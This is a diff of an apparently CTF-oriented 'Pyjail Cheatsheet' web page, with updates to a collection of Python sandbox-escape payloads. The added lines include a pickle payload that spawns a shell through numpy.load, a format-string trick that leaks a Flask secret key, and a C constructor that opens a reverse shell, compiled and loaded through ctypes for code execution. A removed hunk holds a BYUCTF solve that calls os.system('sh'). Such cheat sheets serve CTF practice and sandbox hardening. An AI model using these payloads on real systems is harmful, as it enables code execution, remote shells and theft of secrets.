@@ -27,13 +27,13 @@
     <meta http-equiv="content-security-policy" content=""><title>Pyjail Cheatsheet</title><meta property="og:title" content="Pyjail Cheatsheet" data-svelte="svelte-15w3rt">
 	<link href="/_app/immutable/assets/__layout-58a37c92.css" rel="stylesheet">
 	<link href="/_app/immutable/assets/layout-5b9c754d.css" rel="stylesheet">
-	<link rel="modulepreload" href="/_app/immutable/start-2a5be00d.js">
+	<link rel="modulepreload" href="/_app/immutable/start-36ce680c.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-f2a82808.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-36b86faa.js">
 	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e154bb9b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/stores-1686c5b9.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-57d47233.js">
-	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-5251ce6f.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-1cf83f59.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/layout-d6e193e1.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
   </head>
@@ -57,7 +57,7 @@
 <section class="content"><div><h1>Pyjail Cheatsheet</h1>
 
   <p><b>Date:</b>
-    November 27, 2024</p>
+    January 19, 2025</p>
 
   <p><b>Category:</b>
     <span><a href="/blog/category/cheatsheet">cheatsheet</a></span></p>
@@ -176,7 +176,7 @@ numpy<span class="token punctuation">.</span>fromfile<span class="token punctuat
 numpy<span class="token punctuation">.</span>rec<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> formats<span class="token operator">=</span><span class="token string">"i1"</span><span class="token punctuation">)</span>
 numpy<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span> <span class="token comment"># stderr</span>
 
-numpy<span class="token punctuation">.</span>savetxt<span class="token punctuation">(</span><span class="token string">"/tmp/exp"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"       ossystemhshR."</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fmt<span class="token operator">=</span><span class="token string">'%s'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"latin-1"</span><span class="token punctuation">)</span> <span class="token comment"># any pickle to execute, ie: &#96;pickora -c 'from os import system; system("sh")'&#96;</span>
+numpy<span class="token punctuation">.</span>savetxt<span class="token punctuation">(</span><span class="token string">"/tmp/exp"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x8c\x06system\x93\x94\x94h\x01\x8c\x02sh\x85R."</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fmt<span class="token operator">=</span><span class="token string">'%s'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"latin-1"</span><span class="token punctuation">)</span> <span class="token comment"># any pickle to execute, ie: &#96;pickora -c 'from os import system; system("sh")'&#96;</span>
 numpy<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"/tmp/exp"</span><span class="token punctuation">,</span> allow_pickle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token comment"># https://numpy.org/doc/stable/reference/generated/numpy.load.html</span></code><!-- HTML_TAG_END --></pre>
 <h2 id="bypasses-and-payloads"><a href="#bypasses-and-payloads">Bypasses and payloads</a></h2>
 <h3 id="decorators"><a href="#decorators">decorators</a></h3>
@@ -349,6 +349,32 @@ app <span class="token comment"># the name of the main program in order to impor
 <span class="token comment"># overwrite BROWSER env for RCE through antigravity in help</span>
 <span class="token punctuation">[</span><span class="token punctuation">[</span>1for <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"BROWSER"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'/bin/sh -c "cat /flag.txt" #%s'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
 antigravity</code><!-- HTML_TAG_END --></pre>
+<h3 id="format-string"><a href="#format-string">format string</a></h3>
+<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># leak and access attributes with format string</span>
+<span class="token keyword">import</span> numpy
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'SECRET'</span>
+<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">id</span>
+        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username
+    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'&lt;User &#123;u.username&#125; (id &#123;&#123;i.id&#125;&#125;)>'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>u<span class="token operator">=</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">=</span>self<span class="token punctuation">)</span>
+user <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'&#123;i.__init__.__globals__[app].secret_key&#125;'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>
+
+<span class="token comment"># on another, it is also possible to get an RCE w/ file upload or write access</span>
+<span class="token comment"># - https://corgi.rip/posts/buckeye-writeups/#gentleman</span>
+<span class="token comment"># - https://ctf.gg/blog/buckeyectf-2024/gentleman</span>
+<span class="token comment"># - https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared</span>
+<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/lib.c"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'#include &lt;stdlib.h>&#92;n__attribute__((constructor))&#92;nvoid init() &#123;&#92;nsystem("python3 -c \"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\"");&#92;n&#125;'</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"gcc -shared -fPIC /tmp/lib.c -o lib.so"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># essentially, write .so / .dll file to system first, then load it as a c library for RCE (important to note that ctypes being loaded as well as file upload or write is neccessary for this to work)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
 <h3 id="stable-payloads"><a href="#stable-payloads">stable payloads</a></h3>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># @salvatore-abello - type.__subclasses__(type)[0] -> &lt;class 'abc.ABCMeta'></span>
 <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"breakpoint"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># need __import__</span>
@@ -377,6 +403,9 @@ antigravity</code><!-- HTML_TAG_END --></pre>
 <li><code>class instances</code>:<ul class="list"><li><code>class cobj:...</code><ul class="list"><li><code>obj = cobj()</code></li></ul></li>
 <li><code>type(&quot;cobj&quot;, (object,), {})()</code><ul class="list"><li><code>[].__class__.__class__(&quot;cobj&quot;, [].__class__.__bases__.__class__([[].__class__.__base__]), {})()</code></li></ul></li></ul></li></ul>
 <h2 id="ctf"><a href="#ctf">CTF</a></h2>
+<h3 id><a href="#"></a></h3>
+<ul class="list"><li><code>jail.py</code></li></ul>
+<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py">https<span class="token punctuation">:</span><span class="token operator">//</span>ctf<span class="token punctuation">.</span>gg<span class="token operator">/</span>blog<span class="token operator">/</span>buckeyectf<span class="token operator">-</span><span class="token number">2024</span><span class="token operator">/</span>gentleman</code><!-- HTML_TAG_END --></pre>
 <h3 id="seccon-ctf-13-1linepyjail"><a href="#seccon-ctf-13-1linepyjail">SECCON CTF 13: 1linepyjail</a></h3>
 <ul class="list"><li><code>jail.py</code></li></ul>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code <span class="token operator">:=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"jail> "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token keyword">and</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span><span class="token string">r'([^()]|())*'</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">":("</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
@@ -1737,11 +1766,6 @@ co <span class="token operator">=</span> clear<span class="token punctuation">(<
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_names<span class="token punctuation">)</span><span class="token punctuation">)</span>
 val <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>co<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
-<h3 id="byuctf-2023-builtins-1"><a href="#byuctf-2023-builtins-1">BYUCTF 2023: Builtins 1</a></h3>
-<ul class="list"><li><code>b1.py</code></li></ul>
-<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
-<ul class="list"><li><code>solve.py</code></li></ul>
-<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
 <h3 id="byuctf-2023-builtins-2"><a href="#byuctf-2023-builtins-2">BYUCTF 2023: Builtins 2</a></h3>
 <ul class="list"><li><code>b2.py</code></li></ul>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">72</span><span class="token punctuation">]</span>
@@ -1790,13 +1814,13 @@ inp <span class="token operator">=</span> <span class="token builtin">input</spa
 </footer>
 
 
-		<script type="module" data-sveltekit-hydrate="1hy5q6l">
-		import { set_public_env, start } from "/_app/immutable/start-2a5be00d.js";
+		<script type="module" data-sveltekit-hydrate="9a2y8a">
+		import { set_public_env, start } from "/_app/immutable/start-36ce680c.js";
 
 		set_public_env({});
 
 		start({
-			target: document.querySelector('[data-sveltekit-hydrate="1hy5q6l"]').parentNode,
+			target: document.querySelector('[data-sveltekit-hydrate="9a2y8a"]').parentNode,
 			paths: {"base":"","assets":""},
 			session: {},
 			route: true,
